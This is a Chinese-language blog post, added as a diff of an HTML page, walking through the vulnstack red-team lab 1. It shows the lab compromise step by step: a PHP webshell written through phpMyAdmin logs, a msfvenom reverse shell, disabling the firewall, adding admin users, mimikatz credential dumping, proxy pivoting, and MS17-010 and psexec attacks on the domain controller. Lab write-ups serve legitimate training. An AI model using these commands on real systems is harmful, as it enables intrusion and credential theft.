@@ -1,0 +1,700 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" type="image/png" href="/img/avatar.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="alanlitl">
+  <meta name="keywords" content="">
+  <title>vulnstack 红队一 - alanlitl-blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"alanlitl.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>alanlitl</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="vulnstack 红队一">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-01-21 18:44" pubdate>
+        2021年1月21日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">vulnstack 红队一</h1>
+            
+            <div class="markdown-body">
+              <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>配置网卡</p>
+<blockquote>
+<p>编辑-&gt;虚拟网络编辑器</p>
+</blockquote>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212181704.png" srcset="/img/loading.gif" alt="QQ截图20201212181654"></p>
+<p>自定义为仅主机模式</p>
+<p>配置win7网络</p>
+<p>添加两块网卡,一块为VMnet1(仅主机模式),一块为VMnet8(net模式连通外网)</p>
+<p>配置VMnet1网卡 (win7)</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212182040.png" srcset="/img/loading.gif" alt="QQ截图20201212182018"></p>
+<p>DNS服务器是windows server的ip, vulnstack配置好了</p>
+<p>使用win7 ping一下 windows server, 能ping同则成功</p>
+<p>配置好后加入域</p>
+<blockquote>
+<p>控制面板-&gt;系统安全-&gt;系统-&gt;高级系统设置,  加入域时会提示已有域用户,登录即可.</p>
+</blockquote>
+<p>此时kali win7都使用VMnet8 都处于同一网段下, 都可访问外网</p>
+<p>kali</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212183004.png" srcset="/img/loading.gif" alt="QQ截图20201212182930"></p>
+<p>win7</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212182939.png" srcset="/img/loading.gif" alt="QQ截图20201212182900"></p>
+<h1 id="拿下win7"><a href="#拿下win7" class="headerlink" title="拿下win7"></a>拿下win7</h1><blockquote>
+<p>如果访问不了网站可能是防火墙的原因, 将apache mysql的程序全部允许通过防火墙即可</p>
+</blockquote>
+<p>目录扫描</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212183757.png" srcset="/img/loading.gif" alt="QQ截图20201212183749"></p>
+<h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>弱口令弱口令登录(root root)</p>
+<ol>
+<li><p>日志拿shell</p>
+<pre><code class="hljs sql">查看日志状况 <span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;%log%&quot;</span>
+开启日志 <span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log=<span class="hljs-string">&#x27;on&#x27;</span>
+修改日志路径 <span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;C:\\phpStudy\\WWW\\test2.php&#x27;</span>
+查看开启情况 <span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;general_log%&quot;</span>
+
+写入shell
+<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php eval($_POST[123]);?&gt;&quot;</span></code></pre>
+</li>
+<li><p>yxcms</p>
+<pre><code class="hljs plain">发现备份文件, 是yxcms 版本 1.2.1</code></pre>
+
+
+</li>
+</ol>
+<h2 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h2><pre><code class="hljs awk">访问index.php?r=admin登录后台
+admin <span class="hljs-number">123456</span>
+
+在前台模板 index_index.php中插入一句话
+
+访问http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.129</span><span class="hljs-regexp">/yxcms/</span>即可getshell</code></pre>
+
+<h1 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h1><h2 id="建立shell"><a href="#建立shell" class="headerlink" title="建立shell"></a>建立shell</h2><ol>
+<li><p>msf</p>
+<pre><code class="hljs routeros">生成windows x64木马
+msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机ip <span class="hljs-attribute">LPORT</span>=12345 -f exe -o hack.exe</code></pre>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181346.png" srcset="/img/loading.gif" alt="QQ截图20201213180407"></p>
+<pre><code class="hljs routeros">建立监听
+use exploit/multi/handler
+<span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp
+注意对应x64
+<span class="hljs-builtin-name">set</span> LHOST 目标机ip
+<span class="hljs-builtin-name">set</span> LPORT 12345
+run</code></pre>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181451.png" srcset="/img/loading.gif" alt="QQ截图20201213181446"></p>
+<pre><code class="hljs crmsh">在蚁剑中执行 <span class="hljs-literal">start</span> hack.exe</code></pre>
+
+</li>
+</ol>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181505.png" srcset="/img/loading.gif" alt="QQ截图20201213180336"></p>
+<ol>
+<li>进程迁移</li>
+</ol>
+<pre><code class="hljs vim">当执行hack.<span class="hljs-keyword">exe</span>后进程是十分容易被发现的
+migrate -<span class="hljs-keyword">N</span> explorer.<span class="hljs-keyword">exe</span>  迁移到任务管理器中
+原先的hack.<span class="hljs-keyword">exe</span>进程也会消失
+
+设置反弹<span class="hljs-keyword">shell</span>后自动迁移
+<span class="hljs-keyword">set</span> autorunscript migrate -<span class="hljs-keyword">N</span> explorer.<span class="hljs-keyword">exe</span>
+或者
+<span class="hljs-keyword">set</span> autorunscript migrate -<span class="hljs-keyword">f</span> (默认迁移到记事本)</code></pre>
+
+<h2 id="开启远程登录"><a href="#开启远程登录" class="headerlink" title="开启远程登录"></a>开启远程登录</h2><p>关闭防火墙</p>
+<p><code>输入shell进入windows的cmd</code></p>
+<p>如果有乱码, 可以输入<code>chcp 65001</code>(65001就是utf-8, 将cmd的编码和kali统一)</p>
+<p>查看防火墙状态</p>
+<p><code>netsh firewall show state</code></p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213185854.png" srcset="/img/loading.gif" alt="QQ截图20201213185542"></p>
+<p>​    关闭防火墙</p>
+<p>​    <code>netsh firewall set opmode disable </code></p>
+<p>​    开启3389端口</p>
+<pre><code class="hljs awk">不知道为啥 kali上反弹的shell不能执行这个命令, 只能使用蚁剑执行
+REG ADD HKLMSYSTEMCurrentControlSetControlTerminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f</code></pre>
+
+<p>​    添加用户</p>
+<pre><code class="hljs dockerfile">net <span class="hljs-keyword">user</span> test <span class="hljs-number">123</span>root! /<span class="hljs-keyword">add</span>
+<span class="bash">net localgroup administrators <span class="hljs-built_in">test</span> /add</span></code></pre>
+
+<p>​    远程登录</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213211741.png" srcset="/img/loading.gif" alt="QQ截图20201213211727"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="hljs stata">ipconfig /all 查询ip 域信息
+systeminfo 查询系统信息
+<span class="hljs-keyword">net</span> config Workstation 查询计算机信息, 域信息
+<span class="hljs-keyword">net</span> user 本机用户
+<span class="hljs-keyword">net</span> user /domain 查询域用户
+<span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> /domain:god god是域名, 查看域主机名
+<span class="hljs-keyword">net</span> user <span class="hljs-keyword">test</span> /domain 查询域内<span class="hljs-keyword">test</span>用户
+<span class="hljs-keyword">net</span> user /domain <span class="hljs-keyword">test</span> 123 修改<span class="hljs-keyword">test</span>用户密码为123
+<span class="hljs-keyword">net</span> group /domain 查询域工作组
+<span class="hljs-keyword">net</span> group 组名 /domain 查询域中某工作组
+<span class="hljs-keyword">net</span> group <span class="hljs-string">&quot;domain admins&quot;</span> /domain 查询域管理员
+<span class="hljs-keyword">net</span> group <span class="hljs-string">&quot;domain controllers&quot;</span> /domain 查看域控制器
+tasklist 查询进程 是否有杀毒软件之类的
+......</code></pre>
+
+
+
+<p>域内主机存活探测</p>
+<ol>
+<li><p>ICMP协议</p>
+<pre><code class="hljs autoit">也就是<span class="hljs-built_in">ping</span>命令
+进入shell执行
+<span class="hljs-keyword">for</span> /L %I <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) <span class="hljs-keyword">DO</span> <span class="hljs-symbol">@ping</span> -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.52</span>.%I | findstr <span class="hljs-string">&quot;TTL&quot;</span>
+探测存活主机</code></pre>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201217204027.png" srcset="/img/loading.gif" alt="QQ截图20201217204020"></p>
+</li>
+<li><p>msf的<code>udp_probe</code></p>
+<blockquote>
+<p>需要添加socks代理, 在后面</p>
+</blockquote>
+</li>
+</ol>
+   <pre><code class="hljs routeros">use auxiliary/scanner/discovery/udp_probe
+<span class="hljs-builtin-name">set</span> rhosts 192.168.52.0/24
+<span class="hljs-builtin-name">set</span> threads 5
+run</code></pre>
+
+<p>   <img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201217203624.png" srcset="/img/loading.gif" alt="QQ截图20201217203619"></p>
+<p>发现DNS server一般为域控</p>
+<img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213215145.png" srcset="/img/loading.gif" alt="QQ截图20201213215114" style="zoom:150%;" />
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201214195912.png" srcset="/img/loading.gif" alt="QQ截图20201213220021"></p>
+<p>这里提权十分简单, 实际情况可能更复杂</p>
+<h2 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h2><pre><code class="hljs awk">自带模块
+post<span class="hljs-regexp">/windows/g</span>ather/smart_hashdump
+使用mimikatz
+	load mimikatz 加载模块
+	mimikatz_command -f sekurlsa::searchPasswords 获取明文密码
+使用kiwi
+	load kiwi
+	creds_all  获取密码
+	kiwi_cmd mimikatz命令  可以使用mimikatz所有命令
+		kiwi_cmd sekurlsa::logonpasswords
+
+上传mimikatz获取明文
+https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gentilkiwi/mimi</span>katz/releases
+上传文件
+meterpreter &gt; upload <span class="hljs-regexp">/home/</span>alanlitl<span class="hljs-regexp">//mimi</span>katz_trunk<span class="hljs-regexp">/x64/mimi</span>katz.exe C:\\phpStudy\\WWW\\yxcms
+进入windows的shell运行mimikatz
+提升权限
+privilege::debug
+获取密码
+sekurlsa::logonPasswords</code></pre>
+
+<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h2><pre><code class="hljs dockerfile">meterpreter &gt; <span class="hljs-keyword">run</span><span class="bash"> autoroute -s 192.168.52.0/24 内网网段</span>
+meterpreter &gt; <span class="hljs-keyword">run</span><span class="bash"> autoroute -p 查看添加的路由</span></code></pre>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215021734.png" srcset="/img/loading.gif" alt="QQ截图20201215021729"></p>
+<h2 id="添加socks4代理"><a href="#添加socks4代理" class="headerlink" title="添加socks4代理"></a>添加socks4代理</h2><pre><code class="hljs pgsql">将上面的进程移到后台(千万不能结束或者新建msf窗口)
+background 或者 <span class="hljs-keyword">session</span> <span class="hljs-number">2</span>(未使用的<span class="hljs-keyword">session</span>数字) 添加到后台
+
+use auxiliary/<span class="hljs-keyword">server</span>/socks4a
+<span class="hljs-keyword">set</span> srvhost kali的ip
+<span class="hljs-keyword">set</span> srvport <span class="hljs-number">1080</span>(如果创建失败可能是端口占用, 使用其他端口即可)
+run</code></pre>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215022410.png" srcset="/img/loading.gif" alt="QQ截图20201215022358"></p>
+<pre><code class="hljs awk">修改<span class="hljs-regexp">/etc/</span>proxychains.conf文件
+改为自己socks的ip port即可</code></pre>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215022450.png" srcset="/img/loading.gif" alt="QQ截图20201215022445"></p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215145143.png" srcset="/img/loading.gif" alt="QQ截图20201215145101"></p>
+<pre><code class="hljs accesslog">前面已经找到了内网的其他主机
+<span class="hljs-number">192.168.52.141</span>和<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">52</span>.<span class="hljs-number">138</span></code></pre>
+
+<h1 id="Win-2K3"><a href="#Win-2K3" class="headerlink" title="Win 2K3"></a>Win 2K3</h1><pre><code class="hljs gams">use exploit/windows/smb/ms17_010_psexec
+<span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span>
+<span class="hljs-keyword">set</span> <span class="hljs-comment">rhost 192.168.52.141</span>
+
+成功拿下
+但是执行mimikatz时却失败了
+
+但我们在前面已经拿到了密码
+2313root!  我更改过</code></pre>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215181758.png" srcset="/img/loading.gif" alt="QQ截图20201215181738"></p>
+<h1 id="拿下域控"><a href="#拿下域控" class="headerlink" title="拿下域控"></a>拿下域控</h1><blockquote>
+<p>开始在kali上使用<code>exploit/windows/smb/psexec</code>模块一直失败, 以为是模块问题, 结果是域控防火墙开着, 只能在win7上使用PsExec.exe进行登录</p>
+</blockquote>
+<h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><blockquote>
+<p>下载地址:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
+</blockquote>
+<p>上传</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221002413.png" srcset="/img/loading.gif" alt="QQ截图20201220215210"></p>
+<p>在已经拿下的win7上执行(远程桌面)</p>
+<pre><code class="hljs vim">PsExec.<span class="hljs-keyword">exe</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">52.138</span> -<span class="hljs-keyword">u</span> liukaifeng01 -s cmd.<span class="hljs-keyword">exe</span>  输入密码后进入交互<span class="hljs-keyword">shell</span>
+一定要加-s以<span class="hljs-built_in">system</span>权限执行</code></pre>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221001730.png" srcset="/img/loading.gif" alt="QQ截图20201220231352"></p>
+<blockquote>
+<p>这时已经相当于拿下域控了, 我们现在开启远程桌面</p>
+</blockquote>
+<h3 id="关闭域控防火墙"><a href="#关闭域控防火墙" class="headerlink" title="关闭域控防火墙"></a>关闭域控防火墙</h3><p>查看防火墙状态(win8 开始就有了不同的防火墙命令)</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221001711.png" srcset="/img/loading.gif" alt="QQ截图20201220215515"></p>
+<p>关闭防火墙</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221002125.png" srcset="/img/loading.gif" alt="QQ截图20201220231352"></p>
+<p>现在就可以使用msf远程登录了</p>
+<p>要在开启proxychains代理的情况下</p>
+<pre><code class="hljs routeros">use exploit/windows/smb/psexec
+<span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter/bind_tcp  (这里要使用主动连接, 域控在内网里面.我们无法访问)
+<span class="hljs-builtin-name">set</span> rhosts 192.168.52.138
+<span class="hljs-builtin-name">set</span> smbpass 2313root!
+<span class="hljs-builtin-name">set</span> smbuser liukaifeng01
+run</code></pre>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221003137.png" srcset="/img/loading.gif" alt="QQ截图20201220231430"></p>
+<h3 id="远程连接域控"><a href="#远程连接域控" class="headerlink" title="远程连接域控"></a>远程连接域控</h3><pre><code class="hljs gradle">设置远程桌面端口
+reg add <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> <span class="hljs-regexp">/t REG_DWORD /</span>v portnumber <span class="hljs-regexp">/d 3389 /</span>f
+开启远程桌面
+wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span></code></pre>
+
+<p>在windows下配置代理</p>
+<p>使用proxifier(网上有许多教程)</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221005804.png" srcset="/img/loading.gif" alt="屏幕截图 2020-12-21 000138"></p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221005810.png" srcset="/img/loading.gif" alt="QQ截图20201221000109"></p>
+<p>其中address是你的kali的ip, kali要先搭建好proxychains</p>
+<p>代理好后,在浏览器访问<code>192.168.52.99或者192.168.52.138</code></p>
+<p>如果能访问则代理成功</p>
+<blockquote>
+<p>这里还遇到一个小坑, 输入账号的时候不能使用直接使用<code>liukaifeng01</code>,要使用GOD\liukaifeng01, 否则就会提示密码错误</p>
+</blockquote>
+<p>错误的账户</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010133.png" srcset="/img/loading.gif" alt="QQ截图20201220235829"></p>
+<p>使用正确的账户登录</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010140.png" srcset="/img/loading.gif" alt="QQ截图20201220235852"></p>
+<p>远程连接成功</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010055.png" srcset="/img/loading.gif" alt="QQ截图20201220235906"></p>
+<h3 id="使用-ms17-010"><a href="#使用-ms17-010" class="headerlink" title="使用 ms17-010"></a>使用 ms17-010</h3><p>在关闭防火墙的情况下</p>
+<pre><code class="hljs gams">proxychains msfconsole   使用代理启动msf
+use exploit/windows/smb/ms17_010_psexec
+<span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span>  不出网使用正向连接
+<span class="hljs-keyword">set</span> <span class="hljs-comment">rhost 192.168.2.138</span> 域<span class="hljs-comment">ip</span>
+run
+
+
+msf5 <span class="hljs-comment">exploit(windows</span>/smb/<span class="hljs-comment">ms17_010_psexec) &gt; run</span>
+|S-chain|-&lt;&gt;-192.168.3.130:1080-&lt;&gt;&lt;&gt;-192.168.2.138:445-&lt;&gt;&lt;&gt;-OK
+
+[*] 192.168.2.138:445 - Target <span class="hljs-comment">OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1</span>
+[*] 192.168.2.138:445 - Built <span class="hljs-comment">a write-what-where primitive...</span>
+[+] 192.168.2.138:445 - Overwrite <span class="hljs-comment">complete... SYSTEM session obtained!</span>
+[*] 192.168.2.138:445 - Selecting <span class="hljs-comment">PowerShell target</span>
+[*] 192.168.2.138:445 - Executing <span class="hljs-comment">the payload...</span>
+[+] 192.168.2.138:445 - Service <span class="hljs-comment">start timed out, OK if running a command or non-service executable...</span>
+[*] Started <span class="hljs-comment">bind TCP handler against 192.168.2.138:4444</span>
+|S-chain|-&lt;&gt;-192.168.3.130:1080-&lt;&gt;&lt;&gt;-192.168.2.138:4444-&lt;&gt;&lt;&gt;-OK
+[*] Sending <span class="hljs-comment">stage (176195 bytes) to 192.168.2.138</span>
+[*] Meterpreter <span class="hljs-comment">session 1 opened (0.0.0.0:0 -&gt; 192.168.3.130:1080) at 2021-01-21 18:07:19 +0800</span>
+
+meterpreter <span class="hljs-comment">&gt; getuid</span>
+Server <span class="hljs-comment">username: NT AUTHORITY\SYSTEM</span>
+
+成功获取拿下域</code></pre>
+
+<p>参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/g0udan/p/12411937.html">https://www.cnblogs.com/g0udan/p/12411937.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/12/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">
+                        <span class="hidden-mobile">数据结构</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
